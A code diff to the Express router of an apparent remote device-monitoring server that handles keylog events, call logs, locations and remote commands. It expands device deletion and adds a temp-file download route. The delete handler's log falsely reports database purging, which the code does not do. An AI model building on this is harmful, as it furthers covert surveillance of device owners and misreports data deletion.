@@ -68,14 +68,28 @@ router.get('/devices', (req, res) => {
 
 /**
  * DELETE /api/device/:deviceId - Permanently delete a device
+ * Cascade: server memory + Supabase (devices, call_logs, locations, keylog_events, scheduled_commands, command_history)
  */
 router.delete('/device/:deviceId', (req, res) => {
     const { deviceId } = req.params;
     const removed = socketRegistry.deleteDevice(deviceId);
     if (removed) {
-        // Also clear any cached data for this device
+        // Clear ALL in-memory caches for this device
         if (global.keylogCache) global.keylogCache.delete(deviceId);
         callLogCache.delete(deviceId);
+        locationCache.delete(deviceId);
+
+        // Cancel all scheduled commands
+        try {
+            commandDispatcher.cancelAllScheduled(deviceId);
+        } catch (e) {
+            // cancelAllScheduled may not exist, ignore
+        }
+
+        // Clear command history
+        commandDispatcher.clearHistory(deviceId);
+
+        console.log(`[Admin] Device ${deviceId} fully deleted — all caches and DB records purged`);
         res.json({ success: true, message: `Device ${deviceId} permanently deleted` });
     } else {
         res.status(404).json({ success: false, error: 'Device not found' });
@@ -252,6 +266,26 @@ router.post('/device-upload-temp', upload.single('file'), (req, res) => {
 });
 
 /**
+ * GET /api/download-temp/:filename - Download a temp-uploaded file
+ * Used by device to download files uploaded via /api/device-upload-temp
+ * (e.g., video playback: dashboard uploads video → device downloads to play)
+ */
+router.get('/download-temp/:filename', (req, res) => {
+    const { filename } = req.params;
+
+    // Sanitize filename to prevent path traversal
+    const safeName = path.basename(filename);
+    const filePath = path.join(process.cwd(), 'uploads', safeName);
+
+    // Check file exists
+    res.download(filePath, (err) => {
+        if (err && !res.headersSent) {
+            res.status(404).json({ error: 'File not found' });
+        }
+    });
+});
+
+/**
  * GET /api/download/:deviceId - Download file from device
  */
 router.get('/download/:deviceId', async (req, res) => {
@@ -327,25 +361,7 @@ router.get('/stats', (req, res) => {
     });
 });
 
-/**
- * DELETE /api/device/:deviceId - Permanently delete device (admin only)
- */
-router.delete('/device/:deviceId', (req, res) => {
-    const { deviceId } = req.params;
-
-    const removed = socketRegistry.deleteDevice(deviceId);
-    if (removed) {
-        res.json({
-            success: true,
-            message: `Device ${deviceId} permanently deleted`,
-        });
-    } else {
-        res.status(404).json({
-            success: false,
-            error: 'Device not found',
-        });
-    }
-});
+// (Device delete route is defined above at line ~69 — single comprehensive handler)
 
 /**
  * GET /api/device/:deviceId/history - Get command history for device
